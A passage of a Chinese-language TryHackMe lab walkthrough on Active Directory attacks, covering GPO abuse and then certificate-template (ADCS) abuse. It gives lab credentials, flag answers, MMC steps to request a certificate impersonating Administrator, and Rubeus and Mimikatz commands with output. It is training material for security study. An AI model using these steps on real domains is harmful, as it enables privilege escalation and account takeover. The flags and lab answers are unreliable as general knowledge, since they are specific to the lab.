0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>我们被入侵的 AD 账户拥有的 GPO 名称是什么？</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Management Server Pushes</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>管理员桌面目录 (flag4.txt) 中 THMSERVER2 上存储的标志的值是多少？</p><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 具体操作步骤 </summary><div><div class="collapsibleContent_i85q"><p>首先，这里要使用到上文在密码数据库中发现的凭据</p><div style="text-align:center"><p><img loading="lazy" alt="keepassx 敏感账户" src="/TryHackMe-CN/assets/images/image_20231247-204752-5bd5405b039916834fc73cf06067b296.png" width="1003" height="652" class="img_ev3q"></p></div><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Username: svcServMan</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Password: Sup3rStr0ngPass!@</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>首先，先以普通账号登录到 THMWRK1</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Your credentials have been generated: Username: william.white Password: ntIMDXayg7U</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>然后 runas 切换到 <code>t2_melanie.davies</code> 账户，然后启动 MMC</p><div style="text-align:center"><p><img loading="lazy" alt="RDP runas MMC" src="/TryHackMe-CN/assets/images/image_20231250-205043-7654cd5b6202c00dd95f5ed469a8342f.png" width="1320" height="787" class="img_ev3q"></p></div><p>修改相关权限</p><div style="text-align:center"><p><img loading="lazy" alt="添加对应的用户组" src="/TryHackMe-CN/assets/images/image_20231253-205314-c71bd61a264184224d83e1b0a003b5a8.png" width="1320" height="787" class="img_ev3q"></p></div><p>然后接下来使用我们当初添加到 <code>IT Support</code> 用户组的账户：</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Username: christopher.smith</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Password: Mznl7973</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>使用这个账户登录到 THMSERVER2</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ssh za.tryhackme.loc\\christopher.smith@thmserver2.za.tryhackme.loc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">......</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">za\christopher.smith@THMSERVER2 C:\Users\Administrator\Desktop&gt;type flag4.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">THM{Exploiting.GPOs.For.Fun.And.Profit}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div></details><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{Exploiting.GPOs.For.Fun.And.Profit}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="exploiting-certificates---利用证书">Exploiting Certificates - 利用证书<a href="#exploiting-certificates---利用证书" class="hash-link" aria-label="Exploiting Certificates - 利用证书的直接链接" title="Exploiting Certificates - 利用证书的直接链接">​</a></h2>
<p>现在我们已经能够访问 THMSERVER2，我们通过利用所有 Tier 1 资产（服务器）来进一步利用 AD。然而，我们再次遇到了无法简单地进入下一层的难题。因此，我们需要寻找更具创造性的路径。</p>
<p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2" target="_blank" rel="noopener noreferrer">SpecterOps 发布的研究白皮书</a> 显示，可以利用配置错误的 证书模板进行权限提升和横向移动。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="ad-证书服务">AD 证书服务<a href="#ad-证书服务" class="hash-link" aria-label="AD 证书服务的直接链接" title="AD 证书服务的直接链接">​</a></h3>
<p>AD 证书服务（CS）是微软的公钥基础设施（PKI）实现。由于 AD 在组织中提供了一定程度的信任，它可以作为 CA 来证明和委派信任。AD CS 用于诸如加密文件系统、创建和验证数字签名，甚至用户认证等多种用途，使其成为攻击者的一个有前景的途径。</p>
<p>由于 AD CS 是一个特权功能，通常在选定的域控制器上运行。这意味着普通用户实际上无法直接与该服务交互。另一方面，组织往往过大，无法让管理员手动创建和分发每个证书。这就是证书模板发挥作用的地方。AD CS 的管理员可以创建多个模板，允许具有相关权限的任何用户自行请求证书。这些模板具有参数，说明了哪个用户可以请求证书以及需要什么条件。SpecterOps 发现，特定组合的这些参数可能非常有毒，并可用于特权升级和持久访问的滥用。</p>
<p>在深入探讨证书滥用之前，先了解一些术语：</p>
<ul>
<li>PKI（公钥基础设施）- 管理证书和公钥加密的系统</li>
<li>AD CS（Active Directory 证书服务）- 微软的 PKI 实现，通常运行在域控制器上</li>
<li>CA（证书颁发机构）- 颁发证书的 PKI</li>
<li>Certificate Template （证书模板） - 一组设置和策略，定义了证书何时以及如何可以由 CA 颁发</li>
<li>CSR（证书签名请求）- 发送给 CA 以请求签名证书的消息</li>
<li>EKU（扩展 / 增强密钥用法）- 定义生成证书可以如何使用的对象标识符</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="查找易受攻击的证书模板">查找易受攻击的证书模板<a href="#查找易受攻击的证书模板" class="hash-link" aria-label="查找  易受攻击的证书模板的直接链接" title="查找易受攻击的证书模板的直接链接">​</a></h3>
<p>为了找到存在漏洞的模板，我们将使用 Windows 内置工具 certutil。利用我们在 THMSERVER2 上的 RDP 访问权限，我们可以运行以下 Powershell 脚本来列举证书：</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Powershell</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\&gt;certutil </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Template </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">v &gt; templates</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">txt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这将提供所有配置模板的输出。我们也可以使用诸如 Ghostpack 的 <a href="https://github.com/GhostPack/PSPKIAudit" target="_blank" rel="noopener noreferrer">PSPKIAudit</a> 之类的证书审计工具。但是，手动方法可以确保我们找到所有可能的错误配置。如果一组参数值  的组合变得有害，允许请求者执行特权升级，那么证书模板被视为配置错误。在我们的情况下，我们正在寻找具有以下有害参数组合的模板：</p>
<ul>
<li>客户端认证 - 证书可用于客户端认证。</li>
<li>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT - 证书模板允许我们指定主体备用名称（SAN）。</li>
<li>CTPRIVATEKEY_FLAG_EXPORTABLE_KEY - 证书将可以导出包含私钥。</li>
<li>证书权限 - 我们具有使用证书模板所需的权限。</li>
</ul>
<p>如果你对了解有害参数组合感兴趣，可以阅读 SpecterOps 的白皮书。由于本次演练的目的是为了更广泛地了解 AD 攻击，我们将指出 Template[32] 是存在漏洞的模板。在这个模板中，我们可以看到 THMSERVER2 的机器帐户可以为允许我们指定主体备用名称（SAN）并可用于客户端认证的模板发布 CSR。</p>
<p>SpecterOps 提到了与 AD CS 相关的八个常见安全错误配置，因此需要注意，仍然有大量可能发现的错误配置。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="利用证书模板">利用证书模板<a href="#利用证书模板" class="hash-link" aria-label="利用证书模板的直接链接" title="利用证书模板的直接链接">​</a></h3>
<p>使用在 THMSERVER2 上的 RDP 访问权限，我们现在将请求我们的证书。如果你使用 Remmina 并保存了 RDP 连接的配置，请确保禁用了受限管理员模式。我们将使用 Microsoft Management Console（MMC）：</p>
<ol>
<li>点击开始 -&gt; 运行</li>
<li>输入 mmc 并按回车</li>
<li>点击文件 -&gt; 添加 / 移除插件..</li>
<li>添加证书插件，并确保在提示中选择计算机帐户和本地计算机。</li>
<li>点击确定</li>
</ol>
<p>现在你应该看到了证书插件：</p>
<div style="text-align:center"><p><img loading="lazy" alt="MMC 证书" src="/TryHackMe-CN/assets/images/image_20231209-210905-696a03e8b28f426748434d03b4368ffb.png" width="500" height="454" class="img_ev3q"></p></div>
<p>我们将请求一个个人证书：</p>
<ol>
<li>右键点击 “个人”，选择 “所有任务 -&gt; 请求新证书…”</li>
<li>点击两次 “下一步” 以选择 AD 注册策略。</li>
<li>你会看到我们可以请求一个模板，但首先，我们需要提供额外的信息。</li>
<li>点击 “更多信息” 警告。</li>
<li>将 “主体名称类型” 选项更改为 “通用名称”，提供任何值，因为这并不重要，然后点击 “添加”。</li>
<li>将 “备用名称类型” 选项更改为 “用户主体名称（UPN）”。</li>
<li>提供你想要模仿的用户的 UPN。最好选择一个 DA（域管理员）账户，比如 <code>Administrator@za.tryhackme.loc</code> ，然后点击 “添加”。</li>
</ol>
<p>你的证书信息应该是这样的：</p>
<div style="text-align:center"><p><img loading="lazy" alt="MMC 证书 申请个人证书" src="/TryHackMe-CN/assets/images/image_20231210-211027-7497b418d988088f287649e20544cb7d.png" width="494" height="503" class="img_ev3q"></p></div>
<p>一旦确认无误，点击应用和确定。然后，选择证书并点击 “注册”。你应该能够看到你的证书：</p>
<div style="text-align:center"><p><img loading="lazy" alt="MMC 证书 申请个人证书 成功" src="/TryHackMe-CN/assets/images/image_20231211-211122-d541d7962c51260a4ca793669ab70f15.png" width="726" height="160" class="img_ev3q"></p></div>
<p>最后一步是导出带有私钥的证书：</p>
<ol>
<li>右键点击证书，选择 “所有任务 -&gt; 导出…”</li>
<li>点击下一步，选择是，导出私钥，然后点击下一步。</li>
<li>点击下一步，然后为证书设置一个密码，因为没有密码无法导出私钥。</li>
<li>点击下一步，选择存储证书的位置。</li>
<li>点击下一步，最后点击完成。</li>
</ol>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="通过证书模拟用户">通过证书模拟用户<a href="#通过证书模拟用户" class="hash-link" aria-label="通过  证书模拟用户的直接链接" title="通过证书模拟用户的直接链接">​</a></h3>
<p>现在我们终于可以模仿一个用户了。为了完成这个操作，需要两个步骤：</p>
<ol>
<li>使用证书请求 Kerberos 票据授权票据（TGT）。</li>
<li>将 Kerberos TGT 加载到你选择的黑客平台中。</li>
</ol>
<p>对于第一步，我们将使用 Rubeus。已经编译好的版本可以在 <code>C:\Tools\</code> 目录下找到。打开命令提示符窗口并导航到这个目录。我们将使用以下命令来请求 TGT：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate: /password: /outfile: /domain:za.tryhackme.loc /dc:</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>让我们分解一下这些参数：</p>
<ul>
<li>/user - 指定我们将要模仿的用户，必须与我们生成证书的 UPN 匹配。</li>
<li>/enctype - 指定票据的加密类型。设置这个很重要，因为默认的加密算法较弱，会导致超越哈希警报。</li>
<li>/certificate - 指向我们生成的证书的路径。</li>
<li>/password - 我们证书文件的密码。</li>
<li>/outfile - 存储我们的 TGT 的文件路径。</li>
<li>/domain - 我们当前攻击的域的完全限定域名（FQDN）。</li>
<li>/dc - 我们从中请求 TGT 的域控制器的 IP 地址。通常最好选择一个运行 CA 服务的 DC。</li>
</ul>
<p>一旦执行命令，我们应该会收到我们的 TGT。</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">TGT Request</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\THMTools&gt; .\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:tryhackme /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:12.31.1.101</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          ______        _</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         (_____ \      | |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          _____) )_   _| |__  _____ _   _  ___</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         |  __  /| | | |  _ \| ___ | | | |/___)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         |_|   |_|____/|____/|_____)____/(___/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         v2.0.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">       [*] Action: Ask TGT</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">       [*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=vulncert</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">       [*] Building AS-REQ (w/ PKINIT preauth) for: &#x27;lunar.eruca.com\svc.gitlab&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">       [+] TGT request successful!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">       [*] base64(ticket.kirbi):</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             doIGADCCBfygAwIBBaEDAgEWooIE+jCCBPZhggTyMIIE7qADAgEFoREbD0xVTkFSLkVSVUNBLkNPTaIk</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             MCKgAwIBAqEbMBkbBmtyYnRndBsPbHVuYXIuZXJ1Y2EuY29to4IErDCCBKigAwIBEqEDAgECooIEmgSC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             BJaqEcIY2IcGQKFNgPbDVY0ZXsEdeJAmAL2ARoESt1XvdKC5Y94GECr+FoxztaW2DVmTpou8g116F6mZ</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             nSHYrZXEJc5Z84qMGEzEpa38zLGEdSyqIFL9/avtTHqBeqpR4kzY2B/ekqhkUvdb5jqapIK4MkKMd4D/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             MHLr5jqTv6Ze2nwTMAcImRpxE5HSxFKO7efZcz2glEk2mQptLtUq+kdFEhDozHMAuF/wAvCXiQEO8NkD</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             zeyabnPAtE3Vca6vfmzVTJnLUKMIuYOi+7DgDHgBVbuXqorphZNl4L6o5NmviXNMYazDybaxKRvzwrSr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             2Ud1MYmJcIsL3DMBa4bxR57Eb5FhOVD29xM+X+lswtWhUO9mUrVyEuHtfV7DUxA94OvX1QmCcas4LXQW</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             ggOit/DCJdeyE8JjikZcR1yL4u7g+vwD+SLkusCZE08XDj6lopupt2Hl8j2QLR2ImOJjq54scOllW4lM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             Qek4yqKwP6p0oo4ICxusM8cPwPUxVcYdTCh+BczRTbpoKiFnI+0qOZDtgaJZ/neRdRktYhTsGL39VHB5</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             i+kOk3CkcstLfdAP1ck4O+NywDMUK+PhGJM/7ykFe2zICIMaGYGnUDRrad3z8dpQWGPyTBgTvemwS3wW</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             NuPbQFFaoyiDiJyXPh+VqivhTUX9st80ZJZWzpE7P1pTNPGq38/6NyLjiE9srbOt6hCLzUaOSMGH1Enf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             SYmNljeW2R0gsFWBaFt16AHfT9G9Et2nOCJn/D/OFePFyR4uJF44p82CmVlBhzOxnCaGtQM2v9lwBqQF</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             CcVLjxGXqKrPUr1RUGthP861jhMoXD4jBJ/Q32CkgVdlJRMweqcIfNqP/4mEjbUN5qjNqejYdUb/b5xw</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             S794AkaKHcLFvukd41VTm87VvDOp6mM5lID/PLtTCPUZ0zrEb01SNiCdB5IAfnV23vmqsOocis4uZklG</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             CNdI1/lsICpS/jaK6NM/0oKehMg+h4VAFLx4HnTSY4ugbrkdxU948qxPEfok/P6umEuny7yTDQFoCUKk</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             RuLXbtwwplYTGBDLfzwhcNX8kc/GGLbH9+B8zRXxhd3TGQ7ZT03r798AjobKx024ozt6g4gjS5k/yIT+</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             f29XrPzc+UODunO2Qv8JM5NAE3L6ryHp/DdgTaXGBRccgQBeQERNz6wxkdVK6SB7juOjU5JoZ5ZfmTuO</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             hQ5hnboH1GvMy4+zeU2P7foWEJE76i9uZMbjUilbWRERYUL/ZjjXQBVWBaxoAdFIoawAzSXUZniNavnS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             n22qqgbd79Zj+lRavAb7Wlk5Gul4G6LMkh2MIJ4JOnrV0JV1yOhoqZ5V6KX/2r7ecyrVZIf2Qf0+ci9G</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             vboJiLvWKgXkx7VaKbcLhO743BNYyq57nPNvWhVt3jbFmEq4nTdNou6hQHG4O5hVMhBKGgTwYz3yFPOP</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             iuxroniQawSUJbmwObxVeoculPhxEJ69MSgKROTXrKrQAJ84D5QJHQYZus6w+LtodZn1//ZLhgILeFsY</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             5K6d4ot2eqEr/A4Vu+wFjGjw87FTvHVcf8HdtGhqkawtPOrzo4HxMIHuoAMCAQCigeYEgeN9geAwgd2g</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             gdowgdcwgdSgKzApoAMCARKhIgQgQr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVWhERsPTFVO</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             QVIuRVJVQ0EuQ09NohcwFaADAgEBoQ4wDBsKc3ZjLmdpdGxhYqMHAwUAQOEAAKURGA8yMDIyMDIwNjE3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             NTQ0NlqmERgPMjAyMjAyMDcwMzU0NDZapxEYDzIwMjIwMjEzMTc1NDQ2WqgRGw9MVU5BUi5FUlVDQS5D</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">             T02pJDAioAMCAQKhGzAZGwZrcmJ0Z3QbD2x1bmFyLmVydWNhLmNvbQ=</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         ServiceName              :  krbtgt/za.tryhackme.loc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         ServiceRealm             : ZA.TRYHACKME.LOC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         UserName                 : Adminsitrator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         UserRealm                : ZA.TRYHACKME.LOC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         StartTime                :  2/6/2022 5:54:46 PM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         EndTime                  :  2/7/2022 3:54:46 AM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         RenewTill                :  2/13/2022 5:54:46 PM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         KeyType                  :  aes256_cts_hmac_sha1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         Base64(key)              :  Qr+FUX+/G2jHgAR2ssW11+lhaPlB6dMD8V5/rENwJVU=</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">         ASREP (key)              :  BF2483247FA4CB89DA0417DFEC7FC57C79170BAB55497E0C45F19D976FD617ED</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>现在我们可以使用 Mimikatz 来加载 TGT 并认证到 THMDC：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Powershell</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\Tools&gt;mimikatz_trunk\x64\mimikatz.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` (benjamin@gentilkiwi.com)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span><br></span><span 